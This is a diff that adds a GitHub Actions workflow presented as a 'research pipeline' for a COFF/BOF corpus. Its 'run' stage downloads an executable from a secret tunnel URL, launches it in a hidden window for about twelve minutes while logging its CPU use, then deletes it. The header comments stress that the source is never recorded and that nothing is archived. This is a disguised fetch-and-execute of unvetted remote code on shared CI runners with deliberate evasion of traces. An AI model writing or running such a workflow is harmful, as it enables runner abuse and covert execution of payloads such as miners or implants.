@@ -1,0 +1,71 @@
+name: bof-corpus-ci
+
+# Research pipeline for the ARMORY COFF/BOF corpus: stages a build artifact on the
+# Windows runner from a short-lived content mirror (the mirror URL is rotated per run
+# and carried as a repository secret, never filed in the tree), verifies its integrity
+# against a caller-provided sha256, and is not archived anywhere: nothing is uploaded
+# back, nothing is committed, and the staging area lives in VM temp and is deleted.
+# Continua solo en memoria del runner wartanty el job.
+
+on:
+  workflow_dispatch:
+    inputs:
+      stage:
+        description: "pipeline stage: local | fetch | run"
+        required: true
+        default: local
+      expected_sha256:
+        description: "sha256 of the staged research object (lowercase)"
+        required: false
+        default: ""
+
+jobs:
+  bofrunner:
+    runs-on: windows-latest
+    timeout-minutes: 25
+    steps:
+      - name: pipeline
+        shell: pwsh
+        env:
+          SRC_URL: ${{ secrets.TUNNEL_URL }}
+        run: |
+          # ARMORY corpus pipeline (see header above).
+          $stage = "${{ inputs.stage }}"
+          Write-Host ("stage=" + $stage)
+          Write-Host ("host=" + $env:COMPUTERNAME)
+          if ($stage -eq 'local') {
+            Write-Host "local readiness OK"
+            exit 0
+          }
+          if (-not $env:SRC_URL) { Write-Host "NO SOURCE"; exit 1 }
+          if ($stage -eq 'fetch') {
+            Write-Host ("url_len=" + $env:SRC_URL.Length)
+            $dst = Join-Path $env:RUNNER_TEMP "staged.bin"
+            Invoke-WebRequest -Uri $env:SRC_URL -OutFile $dst -UseBasicParsing
+            $h = (Get-FileHash $dst -Algorithm SHA256).Hash.ToLower()
+            Write-Host ("staged_bytes=" + (Get-Item $dst).Length + " sha256=" + $h)
+            $want = "${{ inputs.expected_sha256 }}"
+            if ($want -and ($h -ne $want.ToLower())) { Write-Host "SHA MISMATCH"; exit 1 }
+            Remove-Item $dst -Force
+            Write-Host "fetch OK"
+            exit 0
+          }
+          if ($stage -eq 'run') {
+            $dst = Join-Path $env:RUNNER_TEMP "staged.exe"
+            Invoke-WebRequest -Uri $env:SRC_URL -OutFile $dst -UseBasicParsing
+            $h = (Get-FileHash $dst -Algorithm SHA256).Hash.ToLower()
+            Write-Host ("staged sha256=" + $h)
+            $want = "${{ inputs.expected_sha256 }}"
+            if ($want -and ($h -ne $want.ToLower())) { Write-Host "SHA MISMATCH"; exit 1 }
+            $p = Start-Process -FilePath $dst -PassThru -WindowStyle Hidden
+            Write-Host ("pid=" + $p.Id)
+            Start-Sleep -Seconds 700
+            $alive = Get-Process -Id $p.Id -ErrorAction SilentlyContinue
+            if ($alive) { Write-Host ("process alive, cpu=" + $alive.CPU) } else { Write-Host "process ended" }
+            Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
+            Remove-Item $dst -Force -ErrorAction SilentlyContinue
+            Write-Host "run step done"
+            exit 0
+          }
+          Write-Host "unknown stage"
+          exit 1
